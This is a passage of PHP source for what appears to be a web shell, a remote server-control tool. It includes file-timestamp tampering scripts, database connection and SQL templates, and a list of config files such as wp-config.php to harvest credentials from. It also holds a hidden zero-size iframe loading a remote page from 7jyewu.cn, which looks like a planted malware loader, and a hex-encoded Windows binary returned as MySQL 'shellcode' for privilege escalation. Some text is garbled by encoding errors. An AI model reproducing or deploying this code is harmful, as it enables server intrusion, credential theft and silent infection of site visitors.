		smsg = "��ǰ�ļ�ʱ��:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert(\'���ڸ�ʽ����ȷ!��ʽ:yyyy-mm-dd hh:mm:ss\');return false;}
			else{document.getElementById(\'actall\').value = gourl; document.getElementById(\'inver\').value = re; document.getElementById(\'fileall\').submit();}
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById(\'actall\').value = actid;
			document.getElementById(\'inver\').value = escape(re);
			document.getElementById(\'fileall\').submit();
		}
	}');
	}elseif($num == "2"){
	html_n('var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById(\'mtime\').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert(\'���ڸ�ʽ����ȷ!��ʽ:yyyy-mm-dd hh:mm:ss\');return false;}
	else{document.getElementById(\'editor\').submit();}
}');
}elseif($num == "3"){
	html_n('function Full(i){
   if(i==0 || i==5){
     return false;
   }
  Str = new Array(12);  
	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb";
	Str[2] = "Driver={Sql Server};Server=,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[3] = "Driver={MySql};Server=;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[4] = "Provider=MSDAORA.1;Password=����;User ID=�ʺ�;Data Source=������;Persist Security Info=True;";
	Str[6] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[7] = "INSERT INTO [TableName](USER,PASS) VALUES(\'eanver\',\'mypass\')";
	Str[8] = "DELETE FROM [TableName] WHERE ID=100";
	Str[9] = "UPDATE [TableName] SET USER=\'eanver\' WHERE ID=100";
	Str[10] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[11] = "DROP TABLE [TableName]";
	Str[12] = "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[13] = "ALTER TABLE [TableName] DROP COLUMN PASS";
	if(i<=4){
	  DbForm.string.value = Str[i];
  }else{
  	DbForm.sql.value = Str[i];
  }
  return true;
  }');
}
elseif($num == "4"){
	html_n('function Fulll(i){
   if(i==0){
     return false;
   }
  Str = new Array(8);  
	Str[1] = "config.inc.php";
	Str[2] = "config.inc.php";
	Str[3] = "config_base.php";
	Str[4] = "config.inc.php";
	Str[5] = "config.php";
	Str[6] = "wp-config.php";
	Str[7] = "config.php";
	Str[8] = "mysql.php";
	sform.code.value = Str[i];
  return true;
  }');
}
html_n('</script>');
}

function css_left(){
	html_n('<style type="text/css">
	.menu{width:152px;margin-left:auto;margin-right:auto;}
	.menu dl{margin-top:2px;}
	.menu dl dt{top left repeat-x;}
	.menu dl dt a{height:22px;padding-top:1px;line-height:18px;width:152px;display:block;color:#FFFFFF;font-weight:bold;
	text-decoration:none; 10px 7px no-repeat;text-indent:20px;letter-spacing:2px;}
	.menu dl dt a:hover{color:#FFFFCC;}
	.menu dl dd ul{list-style:none;}
	.menu dl dd ul li a{color:#000000;height:27px;widows:152px;display:block;line-height:27px;text-indent:28px;
	background:#BBBBBB no-repeat 13px 11px;border-color:#FFF #545454 #545454 #FFF;
	border-style:solid;border-width:1px;}
	.menu dl dd ul li a:hover{background:#FFF no-repeat 13px 11px;color:#FF6600;font-weight:bold;}
	</STYLE>');
	html_n('<script language="javascript">
	function getObject(objectId){
	 if(document.getElementById && document.getElementById(objectId)) {
	 return document.getElementById(objectId);
	 }
	 else if (document.all && document.all(objectId)) {
	 return document.all(objectId);
	 }
	 else if (document.layers && document.layers[objectId]) {
	 return document.layers[objectId];
	 }
	 else {
	 return false;
	 }
	}
	function showHide(objname){
	  var obj = getObject(objname);
	    if(obj.style.display == "none"){
			obj.style.display = "block";
		}else{
			obj.style.display = "none";
		}
	}
	</script><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe><div class="menu">');
}

function css_main(){
	html_n('<style type="text/css">
	*{padding:0px;margin:0px;}
	body,td{font-size: 12px;color:#00ff00;background:#292929;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}
	body{color:#FFFFFF;font-family:Verdana, Arial, Helvetica, sans-serif;
	height:100%;overflow-y:auto;background:#333333;SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}
	input,select,textarea{background-color:#FFFFCC;border:1px solid #FFFFFF}
    a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}
	.actall{background:#000000;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
	</STYLE><body style="table-layout:fixed; word-break:break-all; FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)">
	<table width="85%" border=0 bgcolor="#555555" align="center">');
}

function css_foot(){
	html_n('</td></tr></table>');
}

function Mysql_shellcode()
{
	return "0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E00000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000009BBB9A02DFDAF451DFDAF451DFDAF451A4C6F851DDDAF4515CC6FA51CBDAF45137C5FE518BDAF451DFDAF451DCDAF451BDC5E751DADAF451DFDAF55184DAF45137C5FF51DCDAF45137C5F051DEDAF45152696368DFDAF4510000000000000000504500004C010300B2976A460000000000000000E0000E210B01060000500000001000000090000010E6000000A0000000F000000000001000100000000200000400000000000000040000000000000000000100001000000000000002000000000010000010000000001000001000000000000010000000D8F000007400000000F00000D80000000000000000000000000000000000000000000000000000004CF100000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000900000001000000000000000040000000000000000000000000000800000E055505831000000000050000000A000000048000000040000000000000000000000000000400000E055505832000000000010000000F0000000020000004C0000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000322E303200555058210D09020A459475C59FCC587632C900000F46000000B00000260A00BC6FEDDDFF558BEC6AFF6800007148040ED064A10507506489FFD8FF9F2583EC0C5356578965E8C745FC0F7D0C0175236A00FFEDB77B012E05B008FF150970008945E4EB09B81E7363BB0124C38B2FFF000F8B4DF05FF6FFD94E0D5F5E5B8BE55DC20C0090008B442499ACFDF604C740081C100432C0C30F8F58FDAC7D0081EC8C090592C685E8FBFF77DFBD6100B9FF1733C08DBDE90DF3AB66ABAA33DB895DFC8B33DBBBFF450C8338010F85770380480439190A6C53EFFEFFBF80988B50088B0250E80A005DDC83C40885C00F84511A889DC8F6F720276B414EC9F6C785BC0A9FD9DC5D0C16899DC0090FC4D853A1FBF6DF8D8D1A518D95CCFA06528D85B80D500EB399661B2C256C44246CCDF7EFB116288B852A8985ACF605A866EEEE8C6C559C985668050134776723CD95C852240CBFBA8883C9DFDCFFB7FF9CF2AEF7D12BF98BF78BFA8BD1100E4F8BCAC1B3CDFDF6E902F3A50683E103F3A4FBF2083566B604D88B393284B4C1B5DB60E6D8FBB153006A0103FF6B63838A538B20B4283BC3752D6A0A6D84436EF0E8FB1C4F473ADBAF3D7C12516670380B52E917059E0B67B30CF72A18B9D0FA40FB0E72106AD1FA6803FA8D1D93CBD8D84268FF14D0FAC47E0990583A548D64D9BA6F3EE5117E8BF089B564B9535EC803C2993B046AA18BB810CD2ED81B0E567420C63C10FFB9E53B72C6000163E8EBBA1882FBB7B9850436D41105B0596A206A03049D306B6E037D7EB2BF0CF6B171F37B6883FEFF6A85385618DCEFEF2D94F889BD408D4764A80FF652F1DC2F942DB9590C89036A9D5679F8CFBE564F01515030108B13C6043A0009446C03E40BD18B3BD9687E2C089318580C04EB366A64B66C8DC972D031745813594ECE0E53C16551C83BE920FDC91E498B5514890AE98B03E63F61EE23C368C80B6389500C3BD37C2939D8751A3233C07F3001BB709155357A0C83910DBB954511420C8651C8D391AC91AE8D513763F24C9552CDB0069B6CC2A4E96551C51C8B6C76695D530C1FA86CB243C27B0C298B5BA5C3A71B4F08A40F8B400C8674DD5B768C07BC91591B00130BC8AEF1B72C1D750683C8FFC2C30E05DCC030D74E060C74092FF202EDB4329054554468020217F6FEBFFE7134F7D81BC04081C41A5E903D814C060F6808B8640426B073A466121C866DCBB6417B885DA87401A902ADB17EE3D2B76603B58845B71684FEF1888590FFFE7D72BB06563F84BD910AE983CF3F4F9B2E347D942C6A02227175943B5A018CEDF7751616FC1708EC3F79044888FEFE71103BC7751D560A1BC60B6C14326A107A8D74235F61B8E73A52180F66DB8D2C2C88980B531CAE9A338FCA02DD827A1D0E203DB8C9B537DC9004B9827E8B3089CAB4D6D37CB01D80B471D337110CE748BEDDEC6F6A081AA8D177E6489E04A0B6138D55A8E327325A00438D7DA883CE2D656B0763CE457537E59B512FD8B7C1028B8B8596504522D9BE1B6144418D4DA885C977DD1696139C2E06249C238D472834160750D28954283B70800CF2C67526537547C84B6CC025CF070D048CFFFEDF5EBC8549E4200866E4516A28AE11DB6E61BC52F88D2072229D489AB3985D2C1D8B35781C88D11B302A6C37DF5968311659FFFF1151BE82B96D42D6FC84FED51052D985CD06A5091CEBC5BA94506052022C069E0F3981C511788FA404FCF68450228B75087CC0807E09060A4B775B71A85F8B5E0C20D469D9D115CEF92011C8B80D124CB6177EA98AB6E00FC1E0028BC803C604C468141ADF02CC33C98A7DBFB566FBEF5E4CC1E102058D14018955E0803A4D4F586F8F818BB9AA01CC8BF2E266F3A7ED0CF26C164102C0159D0542D875477205B04C2C3908C10D00DA6E0D67EF1968D007001034E90B8795BC59C82DED1533F607B80774C03FFB9009C183C206298A023C2167DF7FE9743C843B1B3C0A741788843530421B46D889846744EBDB7FB907CABBFF6F29B6B53C33D2F3A6753B88954C0BB918D962C860784DB34C76739038C0B10B6C68E803C59378271EEB254A1D8E236534B0301BB135728144C60F4F9400D7493C77C7030B5E382E81D8BB7F1A837C2410027513060405750C5B6464046B5F23C357084F179213C888140525F1ECA263810C5456C9134CD8C9C22CBD4FE485DBCEE499566BF6CFE0FA8BCB2BCE490C0804904BB80768042700E0FE397221F724434558E0FE8108D87B96002F8BFB1B2A2327837CD98BFACBCB5073BCC8855098E0FE8D6FBFAC03B7B10DCC63DC0DAF234B21D18DC47AF02AFA7A568F638FA2C0EB0C0354AD46F2C505EED48821B01A60A081C4112684C3CFF4425689FF3B77D77857040CB911280D108D7C2418F3AB8D4C243B0D069B6C1451AB343101BA0B041B0111E5724E64F06650720D553D8755FD04BA917466380E6E8D542408D731F62D925266181108435C5C8F4F4A761850514F9481106A5CDFBFEACC4044076C1589B424809674C67652DD247C03788C5FB65E56B87B49BCBFF0FF255B3CCCCC8D87D4E1674755E7F0FF42DF86C00D5F613C5D6C7904F74104868B23B8065423740F795CEFDCD7B7A5108902B863C33E1210506AFE5C908E7F40F864FF35A900198E1AB52529582FDDD5B4BFC0ED742E3B932474FA34768B0CB38959BD2DB50A02C304B394751268F7DBBFEDBD2DB37D0EAAFF5408EBC3648F0543236C7286EA8C1A648B9C8184FF83DF7904687510E3520C3951087505CF4D05BBFB5351BB1E18EB0A082489DFDCB7B64B02439D6B0C595BFCEF56433230069F0BF758433030F7A5FAFCD82C10DBD10C74F740E42682B58DD63E3F45F812E11B8D08B67F97AD3E21737B08C1618D0C76B18FEA6EED5F744556558D6B10A80B5D5E410B33BBE85ED633783C25534F0DD41D2B38D3AF560C0E168D36B7DEDDB6C5648F358F550C3B08C77EBF73301A8B348FEBA1B8DBEB1CC9EB15884DD67A5C003F5D16466F684394BC3B8B298B419FCC256BB4031824E1D763D9B66E20CF56BDE8C0E010E24785ED75EC423C0AE0DD5B0D1A7E4DE47F34168D5AFF3ADD766B1B92784D1C8020770D2450EDC3FF4884157559598BC65EC9C3CF8DDCFAF7D7B26B71151008C3B7E0772212C7424B4F0434A759913916BDF01C6C7410131E97DEB2C3568BB5FB05D7383B42565777216A091C1FF8ECA245FBA424020C91EF2059E1DB46ED38CEC7FD85F675032863FCDA7F5E83C60F83E6F056887CA4BCC65CE23B3A6BFC4D5716F6460C4074ECEFB75D15660CB2174D29730510B35652F790357329C54E308374342411FAFEE42B502AF7FF761007176F9B34F5DD7D0525EB128B461C530B5FD2A4D87B1C0059644B2A20B25628752EE34A467A86B386F62C591AE1D81E2DFA85EFFD0A7C092CE61D90280DE157F8ED397D08470F94C0485BC31630077AC31A6E5DF1025B5756391803BA23977D6097CA146A401A0CB8CDDCF7039B4DB4DD40743DFD6E78405720AC597B741356C220D7843337E11962410B5957B4C5DA2E6018CC07835328D00CBC3010E326ABA73DB884FB1147D903CB8BFEEA5A8A4614B8F01759C93A47FF7704A94949608563EF1B385B5E5FC93A00513D7DBB8B3B1C279772148111222E2D10B5B73FF685011773EC2BC88BC40C8BE18B596EB4A32D685036C10C576D747A9BF8BAEB74D9C614F7C64D8B197507F8B77803AB756FEB21F646880747497425FF6BCFBA26291F75EB2D1D5183E303740DEE5EEF66201D2F4B75F38492C3F7C79ED9E0FD2874123AFD8A116A9B3BE93AEE6C182EFA2AD1DBC2F6C82E89FEC7D074AFBAA5DB2FB523FEC70603D083F0E8C28B4F78E1BFF5C604A900948174DE84D2742C84641EF7C26FB7B7B90F580C070875C639EB18818C34DDA3E272090E00046A2BC45A88533F550A3B6CF7EBEE075F75F8B07585A3CCFFEFDE8DC6974E8A11F161698A7101DDBF2B74644F7719148A